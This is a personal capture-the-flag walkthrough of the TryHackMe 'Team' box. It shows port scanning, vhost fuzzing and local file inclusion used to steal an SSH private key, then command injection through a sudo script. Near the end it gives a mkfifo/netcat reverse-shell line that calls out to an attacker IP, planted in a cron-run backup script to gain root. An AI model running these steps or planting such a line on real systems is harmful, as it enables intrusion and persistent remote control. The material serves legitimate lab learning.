- - - 
created : 25-07-2025 

Tags : #easy 
- - - 
# Objective

**Please allow 3-5 minutes for the box to boot**
# Recon

## Rustscan - Nmap

We use [[Rustscan]] that will pass the result to [[Nmap]] :

```bash
┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Team]
└─$ rustscan -a team.thm -- -A 
 
Open 10.10.168.250:21
Open 10.10.168.250:22
Open 10.10.168.250:80
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.5
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Team
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
```

# Enumeration

## HTTP(80)

### Gobuster

We can use [[Gobuster]] tu start [[Enumeration]] on the target :

```bash
┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Team]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -u http://team.thm  

/.hta                 (Status: 403) [Size: 273]
/.htpasswd            (Status: 403) [Size: 273]
/.htaccess            (Status: 403) [Size: 273]
/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
/index.html           (Status: 200) [Size: 2966]
/robots.txt           (Status: 200) [Size: 5]
/scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
/server-status        (Status: 403) [Size: 273]
Progress: 4746 / 4747 (99.98%)

```

![[Pasted image 20250725204448.png]]

![[Pasted image 20250725204548.png]]
### FFuf

Using [[FFuf]] to fuzz vhosts :

```bash
┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Team]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -H 'Host: FUZZ.team.thm' -u http://team.thm -fs 11366 -c
________________________________________________

dev                     [Status: 200, Size: 187, Words: 20, Lines: 10, Duration: 60ms]
www                     [Status: 200, Size: 2966, Words: 140, Lines: 90, Duration: 57ms]
:: Progress: [20478/20478] :: Job [1/1] :: 632 req/sec :: Duration: [0:00:37] :: Errors: 0 ::

```

We use [[Nano]] to add them :

![[Pasted image 20250725205143.png]]

`dev.team.thm` :

![[Pasted image 20250725205220.png]]
![[Pasted image 20250725205306.png]]

### Caido

We can try [[Local File Inclusion (LFI)]] with [[Caido]] :

![[Pasted image 20250725210416.png]]

![[Pasted image 20250725211146.png]]

![[Pasted image 20250725211342.png]]

And we can retrieve the first flag:

![[Pasted image 20250725211728.png]]
# Exploit

We retrieve `dale` [[SSH]] private key, i did it wit [[Caido]] and a [[Local File Inclusion (LFI)]] wordlist for linux systems (i tried not URL encoded and didn't worked):

![[Pasted image 20250725215329.png]]
## SSH First Access

We save it and make it executable with `chmod 600 id_dale` then use it:

```bash
┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Team]
└─$ ssh -i id_dale dale@team.thm                                                          
Last login: Mon Jan 18 10:51:32 2021
dale@ip-10-10-168-250:~$ ls
user.txt
dale@ip-10-10-168-250:~$ cat user.txt
THM{6Y0TXHz7c2d}
```

We have again the flag, retrievable from [[Website]] with [[Local File Inclusion (LFI)]] .
# Lateral Movement - Privilege Escalation

We can start [[Privilege Escalation]] by checking permissions :

```bash
dale@ip-10-10-168-250:/home$ sudo -l
Matching Defaults entries for dale on ip-10-10-168-250:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on ip-10-10-168-250:
    (gyles) NOPASSWD: /home/gyles/admin_checks
dale@ip-10-10-168-250:/home$ cd gyles
dale@ip-10-10-168-250:/home/gyles$ cat admin_checks 
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"

```

We’ll be injecting in the error variable since we see that the variable is directly passed to a system call:

```bash
dale@ip-10-10-168-250:/home/gyles$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: name
Enter 'date' to timestamp the file: /bin/bash
The Date is /bin/bash
id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
```

Now we have a shell as the user Gyle.

Also, going through “.bash_history”, we see a trace of Cronjob running.

Since, going through the file we see that it’s a bash script that copies some backups, we decided to edit the file and add a [[Reverse Shell]] since we knew that a Cronjob was being executed:

```bash
cat main_backup.sh        
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.250.11.13 1337 >/tmp/f
```

We setup a listener with [[Netcat]] and wait for root [[Shell]] :

```bash
┌──(hax㉿HaxonKali)-[~/Scrivania]
└─$ nc -lvnp 1337
listening on [any] 1337 ...

```

Pwned !!